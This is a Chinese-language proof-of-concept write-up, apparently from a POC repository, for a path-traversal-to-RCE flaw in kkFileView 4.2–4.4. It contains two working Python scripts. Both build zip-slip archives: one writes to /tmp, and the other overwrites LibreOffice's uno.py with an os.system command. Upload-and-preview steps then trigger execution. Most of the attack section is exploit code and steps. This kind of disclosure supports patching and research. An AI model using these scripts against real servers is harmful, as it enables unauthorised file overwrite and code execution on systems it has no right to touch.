## kkFileView-v4.3.0-RCE

## 影响版本
```
v4.3.0~v4.40
v4.2.1~v4.2.0
```


## 环境部署
本地源码启动或者docker部署

![image](https://github.com/wy876/POC/assets/139549762/ad4f21c4-0edf-44d9-8ab8-303c42b3e1f3)


## 任意文件上传
```python
import zipfile

if __name__ == "__main__":
    try:
        binary1 = b'1ueeeeee'
        binary2 = b'hacked_by_1ue'
        zipFile = zipfile.ZipFile("hack.zip", "a", zipfile.ZIP_DEFLATED)
        info = zipfile.ZipInfo("hack.zip")
        zipFile.writestr("test", binary1)
        zipFile.writestr("../../../../../../../../../../../../../../../../../../../tmp/flag", binary2)
        zipFile.close()
    except IOError as e:
        raise e
```
制作恶意hack.zip，注意里面必须有一个正常文件，例如test，便于创建hack.zip_缓存文件




![image](https://github.com/wy876/POC/assets/139549762/a85df4cd-a9fd-47a4-b02e-cbeb7770bdb0)


上传文件并预览

![image](https://github.com/wy876/POC/assets/139549762/6c027fca-b554-4920-ad1a-93307a82d1e5)


![image](https://github.com/wy876/POC/assets/139549762/2f6dec05-7d0b-47a3-8b9f-d1b5bfebaf21)

发现成功穿越

## RCE
可以任意文件上传，并且可以追加文件内容

经过我研究发现，目标在使用odt转pdf时会调用系统的Libreoffice，而此进程会调用库中的uno.py文件，因此可以覆盖该py文件的内容
```python
import zipfile

if __name__ == "__main__":
    try:
        binary1 = b'1ue'
        binary2 = b'import os\r\nos.system(\'touch /tmp/hack_by_1ue\')'
        zipFile = zipfile.ZipFile("hack.zip", "a", zipfile.ZIP_DEFLATED)
        info = zipfile.ZipInfo("hack.zip")
        zipFile.writestr("test", binary1)
        zipFile.writestr("../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py", binary2)
        zipFile.close()
    except IOError as e:
        raise e
```
制作恶意的zip包 上传并预览

![image](https://github.com/wy876/POC/assets/139549762/1d09daaa-c0a7-4d36-8bcc-6087d2033d6b)


再随便上传一个odt文件，另其发起libreoffice任务 上传并预览

![image](https://github.com/wy876/POC/assets/139549762/35e50906-d5da-41a6-9310-fc40c614b6ab)


可以看到命令成功被执行

![image](https://github.com/wy876/POC/assets/139549762/7afcb974-479b-47d2-aebd-a214bbcfb6e5)


uno.py中也确实被写入了内容

![image](https://github.com/wy876/POC/assets/139549762/1c83cb1c-9c37-4a7c-8cd0-8f4e615469fa)

## 漏洞来源
- https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC
- https://github.com/kekingcn/kkFileView/issues/553
